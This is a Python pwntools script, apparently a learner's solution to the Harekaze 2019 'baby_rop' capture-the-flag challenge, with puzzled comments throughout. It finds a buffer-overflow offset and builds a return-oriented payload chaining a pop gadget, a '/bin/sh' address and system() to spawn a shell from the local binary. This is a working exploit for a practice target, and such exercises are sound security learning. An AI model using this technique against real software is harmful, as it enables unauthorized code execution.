from pwn import *
# see /home/fc/Documents/CTF/Harekaze2019/baby_rop

def get_offset(elf):
	io = process(elf.path)
	io.sendline(cyclic(2010))		# first overflow it. then find the pattern
	io.wait()
	core = io.corefile
	stack = core.rsp
	info("stack: %#x", stack)		# 0x7ffe18d2f358, keep changing
	pattern = core.read(stack, 4)
	info("pattern: %r", pattern)	# gaaa, the same
	offset = cyclic_find(pattern)
	info("OFFSET: %s", offset)		# 24 ??? how to get this number ???

	# what will happen?
	# io.interactive()
	return offset

elf = context.binary = ELF('babyrop')


# payload = "A"*40 + gadget + print_flag + system
offset = get_offset(elf)		# 24
shell = elf.symbols.binsh		# binsh is a variable in the program
system = elf.symbols.system
pop_gadget = 0x0000000000400683			# how to find the value ????

info("SYSTEM : %#x", system)
info("SHELL : %#x", shell)
info("POP_GADGET : %#x", pop_gadget)

shell = p64(shell)
system = p64(system)
pop_gadget = p64(pop_gadget)

info("SYSTEM: %s", system)
info("SHELL: %s", shell)
info("POP_GADGET: %s", pop_gadget)

# its' all about payload !!!
# payload = 'A'*(offset) + pop_gadget + shell + system
payload = 'A'*(offset)
payload += pop_gadget
payload += shell
payload += system


print("Looooooooook me: ")
print(payload)
print(len(payload))
"""
AAAAAAAAAAAAAAAAAAAAAAAA            # offset
\x83\x06@\x00\x00\x00\x00           # pop_gadget
H\x10`\x00\x00\x00\x00\x00          # shell
\x8c\x04@\x00\x00\x00\x00\x00       # system
48
run again , its' 24 ??

"""



# test start:
io = process(elf.path)
io.sendline(payload)
io.interactive()
